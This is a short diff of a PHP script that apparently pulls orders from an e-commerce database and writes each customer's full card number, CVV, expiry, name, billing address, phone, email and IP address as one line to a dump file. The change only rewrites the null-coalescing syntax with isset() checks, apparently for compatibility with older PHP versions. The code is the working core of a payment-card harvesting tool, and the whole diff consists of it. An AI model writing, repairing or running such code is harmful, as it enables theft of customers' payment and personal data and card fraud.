@@ -113,8 +113,16 @@ $exp_y = isset($r['cc_exp_year']) ? $r['cc_exp_year'] : (isset($info['cc_exp_yea
     $ba = $stmt_a->fetch();
 if (!$ba) $ba = array();
 
-    $line = "ORDER={$r['increment_id']} | DATE={$r['created_at']} | METHOD={$r['method']} | PAN={$pan} | CVV={$cvv} | EXP={$exp_m}/{$exp_y} | NAME=".($ba['firstname']??'').' '.($ba['lastname']??'')." | ADDRESS=".str_replace(["\n","\r"],' ',(string)($ba['street']??''))." | CITY=".($ba['city']??'')." | STATE=".($ba['region']??'')." | ZIP=".($ba['postcode']??'')." | COUNTRY=".($ba['country_id']??'')." | PHONE=".($ba['telephone']??'')." | EMAIL={$r['customer_email']} | IP={$r['remote_ip']}";
-    
+    $firstname = isset($ba['firstname']) ? $ba['firstname'] : '';
+$lastname  = isset($ba['lastname']) ? $ba['lastname'] : '';
+$street    = isset($ba['street']) ? $ba['street'] : '';
+$city      = isset($ba['city']) ? $ba['city'] : '';
+$state     = isset($ba['region']) ? $ba['region'] : '';
+$zip       = isset($ba['postcode']) ? $ba['postcode'] : '';
+$country   = isset($ba['country_id']) ? $ba['country_id'] : '';
+$phone     = isset($ba['telephone']) ? $ba['telephone'] : '';
+
+$line = "ORDER={$r['increment_id']} | DATE={$r['created_at']} | METHOD={$r['method']} | PAN={$pan} | CVV={$cvv} | EXP={$exp_m}/{$exp_y} | NAME={$firstname} {$lastname} | ADDRESS=" . str_replace(array("\n","\r"), ' ', (string)$street) . " | CITY={$city} | STATE={$state} | ZIP={$zip} | COUNTRY={$country} | PHONE={$phone} | EMAIL={$r['customer_email']} | IP={$r['remote_ip']}";
     fwrite($fp,$line.PHP_EOL);
     $found_count++;
 }
